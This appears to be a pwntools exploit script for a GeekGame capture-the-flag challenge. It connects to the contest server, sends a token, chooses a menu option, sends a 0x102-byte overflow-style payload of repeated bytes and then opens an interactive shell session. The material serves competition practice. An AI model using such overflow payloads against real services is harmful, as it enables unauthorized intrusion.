from pwn import *

TOKEN = b'<token_is_deleted>'


def main():
    c = remote("prob11.geekgame.pku.edu.cn", 10011)
    c.sendline(TOKEN)
    c.recv(8192)

    def send(b):
        c.sendline(b)
        # print(b.decode())
        x = c.recv(8192)
        print(x.decode())
        # time.sleep(0)

    send(b'4')
    send(b'\x48'*0x102)
    send(b'48')

    c.interactive()

    # x = c.recv(8192 * 4).decode()
    # print(x)

    c.clean()
    c.close()


if __name__ == "__main__":
    main()


# c.interactive()
